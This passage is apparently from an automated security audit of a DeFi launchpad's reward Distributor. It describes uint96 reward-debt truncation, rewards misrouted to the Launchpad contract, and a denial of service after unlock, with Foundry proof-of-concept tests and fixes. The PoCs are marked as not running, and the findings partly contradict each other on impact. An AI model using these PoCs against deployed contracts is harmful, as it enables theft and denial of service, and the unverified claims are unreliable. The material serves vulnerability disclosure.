2. **Unexpected reverts**: if the wrapped debt results in `baseAmount` or `quoteAmount` being computed as greater than the remaining `totalPendingRewards`, `_decreaseTotalPending` will revert with `ClaimAmountExceedsTotalPendingRewards()`. This can brick reward operations for that asset, effectively DoS‑ing the rewards pool and preventing users from claiming the remaining rewards.

Triggering this requires that the **total lifetime rewards distributed to some share bucket exceed ~7.9e28 units**, which is extremely large but not mathematically impossible (especially for low-value tokens with very large total supply). Since `Distributor.addRewards` is **permissionless**, any EOA can keep adding rewards (up to `uint128` per call, unlimited number of calls) to drive the accumulators arbitrarily high.

Thus, the stated invariant

`totalAccRewards(self.totalShares, self.accBaseRewardPerShare) <= type(uint96).max` and similarly for quote

is not enforced by code and can be violated under extreme but valid inputs, leading to mis-accounting and eventual denial-of-service for the reward pool.

## Impact
If a user’s cumulative rewards exceed 2^96-1, their stored uint96 reward debts silently truncate, causing mis-accounting for that user. After truncation, subsequent claim/stake/unstake calculations can produce exaggerated pending amounts that may exceed Distributor.totalPendingRewards[asset], causing only those specific calls to revert with ClaimAmountExceedsTotalPendingRewards. This does not allow over-withdrawal or direct theft and does not necessarily brick the entire pool for all users, but it can indefinitely DoS reward operations for affected accounts (and any higher-level batch flows that include them).

## Command to Run Test


## Proof of Concept
1) Precondition: A rewards pool exists with totalShares > 0.
2) Over time, arbitrary users call Distributor.addRewards (permissionless) with large uint128 amounts; update() accrues them into acc*PerShare. The cumulative value totalAccRewards(user.shares, accRewardsPerShare) grows without bound.
3) Once totalAccRewards(...) > 2^96 - 1 for some user, the next stake/unstake/claim sets user.baseRewardDebt = uint96(totalAccRewards(...)), silently truncating upper bits (wrap modulo 2^96).
4) Afterwards, pending = totalAccRewards(...) - userDebt becomes overstated (includes amounts already accounted for prior to truncation). When that user calls Distributor.claimRewards, the computed pending may exceed totalPendingRewards[asset], causing a revert ClaimAmountExceedsTotalPendingRewards.
5) Consequence: Affected user cannot claim (and may also fail to stake/unstake if those paths distribute rewards), while other users can still operate as long as their computed amounts do not exceed remaining totalPendingRewards.

## Proof of Code
pragma solidity 0.8.27;

import "forge-std/Test.sol";
import {RewardsTrackerLib, RewardPoolData, UserRewardData, RewardsTrackerStorage} from "contracts/launchpad/libraries/RewardsTracker.sol";
import {Distributor} from "contracts/launchpad/Distributor.sol";

contract RewardsDebtOverflowTest is Test {
    using RewardsTrackerLib for RewardPoolData;

    address private constant LAUNCH_ASSET = address(0xBEEF);
    address private constant QUOTE_ASSET = address(0xCAFE);
    address private constant USER = address(0x1);

    function _pool() internal pure returns (RewardPoolData storage p) {
        return RewardsTrackerStorage.getRewardPool(LAUNCH_ASSET);
    }

    function setUp() public {
        // Initialize a dummy pool and a single staker with 1 share for library-only tests
        RewardPoolData storage p = _pool();
        p.initializePair(LAUNCH_ASSET, QUOTE_ASSET);
        p.userRewards(USER).shares = 1;
        p.totalShares = 1;
    }

    // Proves the silent truncation of debts to uint96 and inflated pending afterward (library level)
    function testDebtDowncastWrapsAfter96Bits() public {
        RewardPoolData storage p = _pool();

        // Choose totalAcc rewards > 2**96 to force wrap on uint96 downcast
        uint256 targetTotal = (uint256(1) << 96) + 100; // > 2**96
        uint256 acc = targetTotal * 1e12; // PRECISION_FACTOR = 1e12, shares = 1
        p.accBaseRewardPerShare = acc;

        // First claim sets debt = uint96(totalAcc) and returns large baseAmount (not asserting transfer here)
        (uint256 baseAmount, ) = p.claim(USER);
        assertEq(baseAmount, targetTotal, "first claim should equal targetTotal");

        // Debt is truncated to low 96 bits: 100
        UserRewardData memory ud = p.getUserData(USER);
        assertEq(ud.baseRewardDebt, 100, "debt should be truncated to 96-bit low part");

        // Next claim: totalAcc - small debt =~ 2**96, demonstrating inflated pending due to wrap
        (uint256 baseAmount2, ) = p.claim(USER);
        assertGt(baseAmount2, type(uint96).max, "pending exceeds 96-bit range after wrap");
    }

    // Demonstrates the revert path in Distributor due to inflated pending > totalPendingRewards
    function testDistributorClaimRevertsAfterDebtWrap() public {
        // Fresh storage context for a realistic invocation path
        // Deploy Distributor and set this test as owner and launchpad
        Distributor d = new Distributor();
        d.initialize(address(this));

        // Create rewards pair and give USER 1 share via launchpad-only function
        d.createRewardsPair(LAUNCH_ASSET, QUOTE_ASSET);
        d.increaseStake(LAUNCH_ASSET, USER, 1);

        // Manually simulate extreme accumulator growth (as if massive rewards were added over time)
        // This mirrors the library state the Distributor consults when calculating claims.
        RewardPoolData storage p = _pool();
        uint256 targetTotal = (uint256(1) << 96) + 100;
        p.accBaseRewardPerShare = targetTotal * 1e12; // shares = 1

        // No corresponding increase to totalPendingRewards was made here, so the inflated pending will exceed it
        vm.prank(USER);
        vm.expectRevert(Distributor.ClaimAmountExceedsTotalPendingRewards.selector);
        d.claimRewards(LAUNCH_ASSET);
    }
}


## Suggested Mitigation
Best fix: widen per-user debts to a larger type and remove narrowing casts.
- Change UserRewardData.baseRewardDebt and quoteRewardDebt from uint96 to uint256 (or uint128 at minimum), and update all assignments and subtractions to operate on full-width integers. For example, in stake/unstake/claim, do:
  userData.baseRewardDebt = totalAccBaseRewards; // uint256
  baseAmount = totalAccBaseRewards - userData.baseRewardDebt;
- Also remove uint128 casts during subtraction in claim/getPendingRewards (use the same width as debts):
  baseAmount = totalAccBaseRewards - userData.baseRewardDebt;
  quoteAmount = totalAccQuoteRewards - userData.quoteRewardDebt;

If storage changes are undesirable:
- Add explicit bounds checks before every downcast:
  uint256 newDebt = totalAccRewards(...);
  if (newDebt > type(uint96).max) revert("RewardsDebtOverflow");
  userData.baseRewardDebt = uint96(newDebt);
- Optionally, enforce a conservative lifetime cap per pool (and per asset) on cumulative rewards inside Distributor.addRewards to keep totalAccRewards(...) well below the 96-bit limit.

These changes prevent silent truncation, ensuring correct accounting and avoiding DoS for affected users even under extreme reward magnitudes.





 **Derived From** : Balance Invariant: Distributor.increaseStake/decreaseStake/claimRewards (via _distributeAssets)

## [H-15]. Staking rewards from bonding curve are misdirected to Launchpad instead of users when shares change

### Finding Severity Justification: Rewards accrued during stake/unstake are transferred to msg.sender inside Distributor._distributeAssets. For increaseStake/decreaseStake, msg.sender is Launchpad (enforced by onlyLaunchpad), not the user. Accounting marks the user’s rewards as paid (reducing totalPendingRewards and updating rewardDebt), but the tokens are sent to Launchpad and become unrecoverable by the user. This causes direct, permanent loss of matured yield for users across normal operation.
## Derived From Pattern/Invariant
Balance Invariant: Distributor.increaseStake/decreaseStake/claimRewards (via _distributeAssets)

## Exploit Type
AccountingInvariantViolation

## Location
Distributor._distributeAssets

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 5
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
The Distributor is designed so that whenever a user's staking shares change (via stake/unstake) or they claim, any accrued rewards for that account are paid out to the user and removed from `totalPendingRewards`.

However, `Distributor._distributeAssets` always transfers rewards to `msg.sender`:

```solidity
function _distributeAssets(address base, uint256 baseAmount, address quote, uint256 quoteAmount) internal {
    if (baseAmount > 0) {
        _decreaseTotalPending(base, baseAmount);
        base.safeTransfer(msg.sender, baseAmount);
    }

    if (quoteAmount > 0) {
        _decreaseTotalPending(quote, quoteAmount);
        quote.safeTransfer(msg.sender, quoteAmount);
    }
}
```

This is correct for `claimRewards`, where `msg.sender` is the user. But for `increaseStake` and `decreaseStake`, `msg.sender` is always the `Launchpad` contract due to the `onlyLaunchpad` modifier:

```solidity
function increaseStake(address launchAsset, address account, uint96 shares)
    external
    onlyLaunchpad
    returns (uint256 baseAmount, uint256 quoteAmount)
{
    RewardPoolData storage rs = RewardsTrackerStorage.getRewardPool(launchAsset);

    (baseAmount, quoteAmount) = rs.stake(account, uint96(shares));
    _distributeAssets(launchAsset, baseAmount, rs.quoteAsset, quoteAmount);
}

function decreaseStake(address launchAsset, address account, uint96 shares)
    external
    onlyLaunchpad
    returns (uint256 baseAmount, uint256 quoteAmount)
{
    RewardPoolData storage rs = RewardsTrackerStorage.getRewardPool(launchAsset);

    (baseAmount, quoteAmount) = rs.unstake(account, uint96(shares));
    _distributeAssets(launchAsset, baseAmount, rs.quoteAsset, quoteAmount);
}
```

Call flow during bonding:
- `LaunchToken._increaseFeeShares` / `_decreaseFeeShares` is triggered on transfers from the `launchpad` to users and from users back.
- These call `Launchpad.increaseStake(account, shares)` / `Launchpad.decreaseStake(account, shares)`.
- Launchpad forwards to `Distributor.increaseStake(msg.sender = Launchpad, account, shares)` / `decreaseStake`.
- `RewardsTrackerLib.stake/unstake` computes pending user rewards `(baseAmount, quoteAmount)` for `account`.
- `_distributeAssets` transfers these rewards to `msg.sender` (Launchpad), not to `account`, while also decreasing `totalPendingRewards` and updating debts as if the user were paid.

This violates the invariant that all staking/unstaking rewards must go to the staker. Accrued yield is effectively skimmed by the Launchpad contract, while the Accounting library considers it fully paid out to the user.

Impact:
- Users lose all incremental rewards triggered by subsequent buys/sells that update staking shares.
- `totalPendingRewards` is lowered correctly, but balances on-chain end up sitting under Launchpad’s control, not users'.
- Since rewards are fully "realized" in the reward accounting, users cannot later recover them via `claimRewards`.

This is a direct loss-of-yield bug affecting all launchpad users who hold bonding shares and then have their shares updated due to later activity.

## Impact
Whenever a user’s shares are adjusted (increaseStake/decreaseStake), any matured rewards for that user are transferred to the Launchpad contract instead of the user. Accounting still marks the user as paid (rewardDebt updated and totalPendingRewards decreased), so the user can no longer claim those rewards. Launchpad accumulates these tokens and there is no mechanism for users to retrieve them, causing permanent loss of yield to users.

## Command to Run Test


## Proof of Concept
Revised minimal PoC (no external infra needed):

1) Setup
- Deploy Distributor and a MockLaunchpad contract.
- Initialize Distributor with launchpad = MockLaunchpad.
- Deploy two ERC20 mocks: LAU (as launchAsset/base) and Q (as quote).
- From MockLaunchpad, call distributor.createRewardsPair(LAU, Q).

2) Initial stake
- From MockLaunchpad, call distributor.increaseStake(LAU, user, 100e18). Now totalShares > 0 and user has shares.

3) Fund rewards
- Mint 100e18 Q to owner; owner approves Distributor.
- Call distributor.addRewards(LAU, Q, 0, 100e18). Pending rewards are now 100e18 Q for the pool.

4) Trigger share change
- From MockLaunchpad, call distributor.increaseStake(LAU, user, 1e18). This computes user’s pending rewards (100e18 Q) and calls _distributeAssets.
- Because msg.sender in Distributor is Launchpad (not the user), _distributeAssets transfers the 100e18 Q to Launchpad.
- rewardDebt is updated as if user was paid; totalPendingRewards for Q is reduced by 100e18.

5) Observe loss
- User’s Q balance remains 0.
- Launchpad’s Q balance increases by 100e18.
- If the user calls distributor.claimRewards(LAU), they receive ~0, since accounting believes they were already paid.

## Proof of Code
pragma solidity 0.8.27;

import "forge-std/Test.sol";
import {Distributor} from "contracts/launchpad/Distributor.sol";

contract DistributorHijackMinimalTest is Test {
    Distributor distributor;
    MockLaunchpad mockLp;
    MockERC20 LAU; // launch asset (base)
    MockERC20 Q;   // quote asset (rewards token)

    address owner = address(this);
    address user = address(0xBEEF);

    function setUp() public {
        distributor = new Distributor();
        mockLp = new MockLaunchpad(distributor);
        // owner initializes Distributor to trust MockLaunchpad
        distributor.initialize(address(mockLp));

        LAU = new MockERC20("LAU", "LAU", 18);
        Q = new MockERC20("Q", "Q", 18);

        // create rewards pair via the launchpad (onlyLaunchpad)
        mockLp.createRewardsPair(address(LAU), address(Q));

        // initial stake so totalShares > 0
        mockLp.increaseStake(address(LAU), user, uint96(100e18));
    }

    function testRewardsMisdirectedToLaunchpadOnStakeChange() public {
        // fund distributor with quote rewards
        Q.mint(address(this), 100e18);
        Q.approve(address(distributor), 100e18);
        distributor.addRewards(address(LAU), address(Q), 0, uint128(100e18));

        // user shares change again (increaseStake). This should pay their matured rewards
        // but funds are sent to msg.sender (Launchpad), not the user.
        uint256 lpQBefore = Q.balanceOf(address(mockLp));
        uint256 userQBefore = Q.balanceOf(user);

        mockLp.increaseStake(address(LAU), user, uint96(1e18));

        uint256 lpQAfter = Q.balanceOf(address(mockLp));
        uint256 userQAfter = Q.balanceOf(user);

        // Launchpad captured the rewards
        assertEq(lpQAfter - lpQBefore, 100e18, "Launchpad should have received the user's matured rewards");
        // User did not receive rewards
        assertEq(userQAfter - userQBefore, 0, "User should not have received rewards");

        // User cannot reclaim them now; accounting marked as paid
        vm.prank(user);
        (uint256 baseAmt, uint256 quoteAmt) = distributor.claimRewards(address(LAU));
        assertEq(quoteAmt, 0, "No claimable rewards remain for the user");
    }
}

contract MockLaunchpad {
    Distributor public distributor;
    constructor(Distributor d) { distributor = d; }

    function createRewardsPair(address base, address quote) external {
        distributor.createRewardsPair(base, quote);
    }

    function increaseStake(address base, address account, uint96 shares) external {
        distributor.increaseStake(base, account, shares);
    }

    function decreaseStake(address base, address account, uint96 shares) external {
        distributor.decreaseStake(base, account, shares);
    }
}

contract MockERC20 {
    string public name; string public symbol; uint8 public decimals;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    uint256 public totalSupply;

    constructor(string memory n, string memory s, uint8 d) { name = n; symbol = s; decimals = d; }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 a = allowance[from][msg.sender];
        if (a != type(uint256).max) allowance[from][msg.sender] = a - amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}


## Suggested Mitigation
Route payouts to the intended beneficiary instead of msg.sender. Modify _distributeAssets to accept a recipient parameter and pass the correct account at each callsite:

- For increaseStake/decreaseStake: recipient = account (the staker whose shares are changing).
- For claimRewards: recipient = msg.sender (the claimer).

Example fix:

function increaseStake(address launchAsset, address account, uint96 shares)
    external
    onlyLaunchpad
    returns (uint256 baseAmount, uint256 quoteAmount)
{
    RewardPoolData storage rs = RewardsTrackerStorage.getRewardPool(launchAsset);
    (baseAmount, quoteAmount) = rs.stake(account, shares);
    _distributeAssets(launchAsset, baseAmount, rs.quoteAsset, quoteAmount, account);
}

function decreaseStake(address launchAsset, address account, uint96 shares)
    external
    onlyLaunchpad
    returns (uint256 baseAmount, uint256 quoteAmount)
{
    RewardPoolData storage rs = RewardsTrackerStorage.getRewardPool(launchAsset);
    (baseAmount, quoteAmount) = rs.unstake(account, shares);
    _distributeAssets(launchAsset, baseAmount, rs.quoteAsset, quoteAmount, account);
}

function claimRewards(address launchAsset) external returns (uint256 baseAmount, uint256 quoteAmount) {
    RewardPoolData storage rs = RewardsTrackerStorage.getRewardPool(launchAsset);
    (baseAmount, quoteAmount) = rs.claim(msg.sender);
    _distributeAssets(launchAsset, baseAmount, rs.quoteAsset, quoteAmount, msg.sender);
}

function _distributeAssets(address base, uint256 baseAmount, address quote, uint256 quoteAmount, address recipient) internal {
    if (baseAmount > 0) { _decreaseTotalPending(base, baseAmount); base.safeTransfer(recipient, baseAmount); }
    if (quoteAmount > 0) { _decreaseTotalPending(quote, quoteAmount); quote.safeTransfer(recipient, quoteAmount); }
}






 **Derived From** : Reward accounting can overflow uint96 rewardDebt, breaking per-user rewards invariants

## [M-16]. RewardsTracker uses uint96 rewardDebt causing overflow/truncation and theft or permanent loss of rewards

### Finding Severity Justification: User rewardDebt and shares are stored as uint96 while totalAccRewards are computed in uint256 and then downcast to uint96 without bounds checks. Over long lifetimes or with large reward injections (permissionless addRewards), totalAccRewards can exceed 2^96-1, causing silent truncation. This breaks the core accounting invariant pending = totalAccRewards - rewardDebt, enabling users to overclaim rewards (draining the pool and other users’ shares) or causing claims to revert due to insufficient totalPendingRewards. Impact can include loss of assets from the shared rewards pool and denial of service to other claimants. While the attack may require very large cumulative rewards (especially for quote assets like USDC), it remains feasible for base assets with large supplies and for adversaries willing to donate large amounts, so overall risk is capped at Medium.
## Derived From Pattern/Invariant
Reward accounting can overflow uint96 rewardDebt, breaking per-user rewards invariants

## Exploit Type
AccountingInvariantViolation

## Location
RewardsTrackerLib.stake/unstake/claim

## Finding Status: Valid
## Status Confidence: SomeWhatConfident
### Finding Confidence Justification: The vulnerability is clear and reproducible from code inspection, but the practical threshold to trigger truncation depends on cumulative rewards magnitude and token supply/usage patterns. For some assets (e.g., USDC) reaching 2^96 token units is unlikely, while for high-supply base tokens or via large donations it is plausible. Given these assumptions on volumes/supplies, confidence is somewhat short of absolute.
### Finding Complexity: 5
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
The rewards module stores per-user `shares`, `baseRewardDebt`, and `quoteRewardDebt` as `uint96`, but computes accumulated rewards in full `uint256` and then downcasts silently to `uint96` without any bounds checks. Over time, as `acc*RewardPerShare` grows (from unbounded `addRewards`) and as user `shares` are large, `totalAccRewards(shares, accRewardsPerShare)` can exceed `2**96 - 1`. The casts in `stake`, `unstake`, and `claim` will truncate the high bits, corrupting the stored debts.

Relevant code (launchpad/libraries/RewardsTracker.sol):
```solidity
struct UserRewardData {
    uint96 shares;
    uint96 baseRewardDebt;
    uint96 quoteRewardDebt;
}

uint128 public constant PRECISION_FACTOR = 1e12;

function totalAccRewards(uint256 shares, uint256 accRewardsPerShare) internal pure returns (uint256) {
    return (shares * accRewardsPerShare) / PRECISION_FACTOR;
}

function stake(RewardPoolData storage self, address user, uint96 newShares) internal
    returns (uint256 baseAmount, uint256 quoteAmount)
{
    ...
    uint256 existingShares = uint96(userData.shares);
    ...
    userData.baseRewardDebt = uint96(totalAccRewards(existingShares + newShares, accBaseRewardsPerShare));
    userData.quoteRewardDebt = uint96(totalAccRewards(existingShares + newShares, accQuoteRewardsPerShare));
}

function unstake(RewardPoolData storage self, address user, uint96 removeShares) internal
    returns (uint256 baseAmount, uint256 quoteAmount)
{
    ...
    uint256 existingShares = uint256(userData.shares);
    ...
    userData.baseRewardDebt = uint96(totalAccRewards(existingShares - removeShares, accBaseRewardsPerShare));
    userData.quoteRewardDebt = uint96(totalAccRewards(existingShares - removeShares, accQuoteRewardsPerShare));
}

function claim(RewardPoolData storage self, address user) internal
    returns (uint256 baseAmount, uint256 quoteAmount)
{
    UserRewardData storage userData = self.userRewards[user];
    uint256 shares = uint256(userData.shares);
    ...
    uint256 totalAccBaseRewards = totalAccRewards(shares, accBaseRewardsPerShare);
    uint256 totalAccQuoteRewards = totalAccRewards(shares, accQuoteRewardsPerShare);

    baseAmount = totalAccBaseRewards - uint128(userData.baseRewardDebt);
    quoteAmount = totalAccQuoteRewards - uint128(userData.quoteRewardDebt);

    userData.baseRewardDebt = uint96(totalAccBaseRewards);
    userData.quoteRewardDebt = uint96(totalAccQuoteRewards);
}
```
`pendingBaseRewards` and `pendingQuoteRewards` are `uint128` and can grow arbitrarily since anyone can call `Distributor.addRewards()` repeatedly, and `accBaseRewardPerShare` / `accQuoteRewardPerShare` are `uint256`. Eventually, `totalAccRewards(shares, accRewardsPerShare)` will overflow the `uint96` range.

Because the truncation is silent, the invariant that `pending = totalAccRewards - rewardDebt` breaks:
- If `rewardDebt` wraps to a much smaller number, `pending` becomes artificially large and users can claim more than their fair pro-rata share. Those overclaims still pass the global `totalPendingRewards` check in `Distributor._decreaseTotalPending`, so they steal rewards from other stakers.
- In other wrap configurations, `rewardDebt` after casting can be larger than the correct accumulated rewards, making `totalAccRewards - rewardDebt` underflow in `Distributor._decreaseTotalPending` (reverting with `ClaimAmountExceedsTotalPendingRewards`) and permanently blocking legitimate reward withdrawals.

Because this applies uniformly to both base and quote rewards, the entire rewards system can become insolvent or locked over long lifetimes or heavy reward schedules. Attackers can accelerate hitting this overflow boundary by repeatedly adding large rewards and/or concentrating shares on a few accounts.

## Impact
Once totalAccRewards exceeds 2^96 − 1, casting to uint96 silently truncates rewardDebt. There are two concrete outcomes: (1) If global pending rewards are insufficient, all future claims for that user revert with ClaimAmountExceedsTotalPendingRewards (DoS/lock of rewards). (2) If sufficient pending rewards exist (e.g., funded by third parties), the user can overclaim far beyond their fair share, draining the pool at the expense of other contributors. Both base and quote reward tracks are affected.

## Command to Run Test


## Proof of Concept
Setup: one rewards pool with a single staker holding shares, and two ERC20 tokens (base, quote). The attacker ensures totalAccRewards > 2^96−1 at the moment of their first claim so that rewardDebt is written as uint96(totalAccRewards) and gets truncated.
1) Launchpad (controlled in test via prank) creates the rewards pair and stakes a large number of shares for attacker.
2) A funder adds a huge base reward R1 = 2^96 + 10 to the pool. Pending and acc* are not yet realized.
3) Attacker calls claimRewards(base): baseAmount = R1 (fair), but baseRewardDebt is stored as uint96(R1) = 10 (truncated).
4) A second, very small reward R2 = 1 is added by another party.
5) Attacker calls claimRewards(base) again. Now the library computes baseAmount = (R1 + R2) − 10 ≈ 2^96 + 1 − 10, which far exceeds totalPendingRewards (≈ 1). The Distributor reverts with ClaimAmountExceedsTotalPendingRewards, permanently blocking claims unless the pool is massively refilled. If instead someone pre-funds the pool with enough rewards to cover this huge amount, the claim succeeds and the attacker drains those third-party funds (overclaim).

## Proof of Code
pragma solidity 0.8.27;

import "forge-std/Test.sol";
import {Distributor} from "contracts/launchpad/Distributor.sol";

contract ERC20Mock {
    string public name = "Mock";
    string public symbol = "MCK";
    uint8 public decimals = 18;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
        emit Transfer(address(0), to, amt);
    }

    function approve(address spender, uint256 amt) external returns (bool) {
        allowance[msg.sender][spender] = amt;
        emit Approval(msg.sender, spender, amt);
        return true;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        require(balanceOf[msg.sender] >= amt, "bal");
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        emit Transfer(msg.sender, to, amt);
        return true;
    }

    function transferFrom(address from, address to, uint256 amt) external returns (bool) {
        uint256 al = allowance[from][msg.sender];
        require(al >= amt, "allow");
        allowance[from][msg.sender] = al - amt;
        require(balanceOf[from] >= amt, "bal");
        balanceOf[from] -= amt;
        balanceOf[to] += amt;
        emit Transfer(from, to, amt);
        return true;
    }
}

contract RewardsDebtOverflowTest is Test {
    Distributor dist;
    ERC20Mock base;
    ERC20Mock quote;
    address launchpad = address(0x1111);
    address attacker = address(0xA11CE);
    address victim = address(0xB0B);

    function setUp() public {
        dist = new Distributor();
        dist.initialize(launchpad);

        base = new ERC20Mock();
        quote = new ERC20Mock();

        // Create rewards pair (only launchpad)
        vm.prank(launchpad);
        dist.createRewardsPair(address(base), address(quote));

        // Give attacker a large share position via the launchpad
        vm.prank(launchpad);
        dist.increaseStake(address(base), attacker, type(uint96).max);
    }

    function test_claimRevertsAfterDebtTruncation() public {
        // Step 1: add a huge reward so totalAccRewards > 2**96 - 1
        uint256 R1 = (uint256(1) << 96) + 10; // fits in uint128
        base.mint(attacker, R1);
        vm.startPrank(attacker);
        base.approve(address(dist), R1);
        dist.addRewards(address(base), address(quote), uint128(R1), 0);

        // First claim: receives R1, but rewardDebt stored as uint96(R1) == 10
        dist.claimRewards(address(base));
        vm.stopPrank();

        // Step 2: Add a tiny new reward
        base.mint(victim, 1);
        vm.startPrank(victim);
        base.approve(address(dist), 1);
        dist.addRewards(address(base), address(quote), 1, 0);
        vm.stopPrank();

        // Step 3: Second claim attempts to withdraw ~2**96 tokens while only ~1 is pending -> revert
        vm.expectRevert(Distributor.ClaimAmountExceedsTotalPendingRewards.selector);
        vm.prank(attacker);
        dist.claimRewards(address(base));
    }
}


## Suggested Mitigation
Store per-user reward debts and shares in a sufficiently wide type (uint256 recommended) and remove narrowing casts. Specifically: change shares, baseRewardDebt, quoteRewardDebt, and totalShares to uint256; write totalAccRewards directly without downcasting. Additionally, replace (shares * acc) / PRECISION_FACTOR with a 512-bit safe mulDiv (e.g., OpenZeppelin Math.mulDiv) to avoid intermediate multiplication overflow. If storage optimization is required, implement explicit bounds with renormalization: periodically subtract a global offset from all users’ debts and from acc*RewardPerShare so values remain well within the chosen bit width, and revert on addRewards when approaching the cap.





 **Derived From** : AccountingInvariantViolation

## [M-17]. LaunchToken bonding share burn after unlock never ends rewards, leaving AMM pair in a permanent DoS state

### Finding Severity Justification: Failure to end the launchpad rewards after unlock leads to GTELaunchpadV2Pair continuing to accrue and attempt to distribute fees when Distributor.totalShares == 0, causing swaps (and liquidity ops that trigger distribution) to revert. This is a protocol availability/DoS impact to a launched market, not direct asset loss, aligning with Medium severity per Code4rena rubric.
## Derived From Pattern/Invariant
AccountingInvariantViolation

## Exploit Type
AccountingInvariantViolation

## Location
LaunchToken._decreaseFeeShares

## Finding Status: Valid
## Status Confidence: Confident
### Finding Complexity: 6
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
LaunchToken’s `_decreaseFeeShares` only calls `_endRewards()` while `!unlocked`, but `_decreaseFeeShares` continues to run after graduation (`unlock()`). This lets all bonding shares be removed post‑unlock without ever calling `Launchpad.endRewards()` → `Distributor.endRewards()` → `GTELaunchpadV2Pair.endRewardsAccrual()`. As a result, the AMM pair keeps `rewardsPoolActive == 1` and continues to accrue launchpad fees, while the rewards pool in `Distributor` can legitimately reach `totalShares == 0`. Once that happens, any swap that triggers launchpad fee distribution calls `Distributor.addRewards`, which reverts with `NoSharesToIncentivize()`, bricking swaps and mint/burn on that pair.

Vulnerable core:

```solidity
// LaunchToken
function _beforeTokenTransfer(address from, address to, uint256 amount) internal override {
    if (!unlocked && from != launchpad && to != launchpad && to != gteRouter) {
        revert TransfersDisabledWhileBonding();
    }

    if (!unlocked) {
        if (from != launchpad && to != launchpad && to != gteRouter) revert TransfersDisabledWhileBonding();

        if (from == launchpad && to != launchpad) _increaseFeeShares(to, amount);
        else if (to != launchpad && to != gteRouter) revert TransfersDisabledWhileBonding();
    }

    if (from != launchpad) _decreaseFeeShares(from, amount);
}

function _decreaseFeeShares(address account, uint256 amount) internal {
    uint256 share = bondingShare[account];
    if (share == 0 || account == address(0)) return;

    amount = amount > share ? share : amount;

    unchecked {
        totalFeeShare -= amount;
        bondingShare[account] -= amount;
    }

    if (totalFeeShare == 0 && !unlocked) _endRewards();

    ILaunchpad(launchpad).decreaseStake(account, uint96(amount));
}

function _endRewards() internal {
    ILaunchpad(launchpad).endRewards();
}
```

`Launchpad.endRewards()` drives the AMM shutdown:

```solidity
function endRewards() external onlyLaunchAsset {
    address quote = _launches[msg.sender].quote;
    IGTELaunchpadV2Pair pair = IGTELaunchpadV2Pair(address(pairFor(address(uniV2Factory), msg.sender, quote)));
    distributor.endRewards(pair);
}

// Distributor
function endRewards(IGTELaunchpadV2Pair pair) external onlyLaunchpad {
    pair.endRewardsAccrual();
}

// GTELaunchpadV2Pair
function endRewardsAccrual() external {
    if (msg.sender != launchpadFeeDistributor) revert("GTEUniV2: FORBIDDEN");

    delete accruedLaunchpadFee0;
    delete accruedLaunchpadFee1;
    delete rewardsPoolActive;
    _update(..., 0, 0);
}
```

But after unlock, bonding‑share burns continue and never hit `_endRewards()` due to `&& !unlocked`. Downstream this breaks the accounting invariant that "if launchpad fees are active, reward pool must have nonzero shares". `GTELaunchpadV2Pair._update` always calls the distributor when launchpad fees accrue:

```solidity
function _update(..., uint112 newLaunchpadFee0, uint112 newLaunchpadFee1) private {
    ...
    if (timeElapsed > 0 && _reserve0 != 0 && _reserve1 != 0) {
        ...
        if (launchpadFeeDistributor > address(0)) {
            if (totalLaunchpadFee0 | totalLaunchpadFee1 > 0) {
                delete accruedLaunchpadFee0;
                delete accruedLaunchpadFee1;
                _distributeLaunchpadFees(totalLaunchpadFee0, totalLaunchpadFee1);
            }
        }
    } else if (launchpadFeeDistributor > address(0) && newLaunchpadFee0 | newLaunchpadFee1 > 0) {
        accruedLaunchpadFee0 = totalLaunchpadFee0;
        accruedLaunchpadFee1 = totalLaunchpadFee1;
    }
}

function _distributeLaunchpadFees(uint112 fee0, uint112 fee1) internal {
    if ((fee0 | fee1) > 0) {
        ...
        IDistributor(distributor).addRewards(_token0, _token1, uint128(fee0), uint128(fee1));
    }
}
```

`Distributor.addRewards` rejects when the reward pool has no stakers:

```solidity
function addRewards(address token0, address token1, uint128 amount0, uint128 amount1) external {
    ...
    if (rs.totalShares == 0) revert NoSharesToIncentivize();
    ...
}
```

Realistic exploit path:
1. Token is in bonding: buys occur via `Launchpad.buy`, minting `LaunchToken` and calling `_increaseFeeShares`, so `totalFeeShare > 0` and Distributor’s `rs.totalShares > 0`.
2. Curve exhausts bonding supply; `Launchpad._graduate` creates LP and calls `LaunchToken(token).unlock()`. `unlocked` flips to true, but existing `bondingShare` balances remain.
3. After unlock, users transfer/sell their `LaunchToken` balances via AMM, CLOB, or P2P. Each transfer calls `_decreaseFeeShares(from, amount)` (since `from != launchpad`). `totalFeeShare` and `bondingShare[from]` are progressively reduced, and Launchpad propagates this to Distributor via `decreaseStake`.
4. Eventually, all bonding shares are fully reduced: `totalFeeShare == 0` and Distributor’s `rs.totalShares == 0`. However, because `unlocked == true`, the `if (totalFeeShare == 0 && !unlocked)` condition never calls `_endRewards()`, so:
   * `Launchpad.endRewards()` is never executed for this pair.
   * `Distributor.endRewards` is never called.
   * `GTELaunchpadV2Pair.rewardsPoolActive` remains `1`, and the pair continues to accumulate launchpad fees.
5. Later swaps or liquidity operations on `GTELaunchpadV2Pair` compute a positive launchpad fee and call `_distributeLaunchpadFees`, which calls `Distributor.addRewards`.
6. Since `rs.totalShares == 0`, `addRewards` reverts with `NoSharesToIncentivize()`, causing the entire swap/mint/burn tx to revert.

Impact: the AMM pair becomes permanently stuck in a state where every swap that tries to distribute fees reverts, effectively DoS‑ing trading and LP operations for that pair. This is reachable by normal user transfers after graduation and does not require privileged roles or misconfiguration.

## Impact
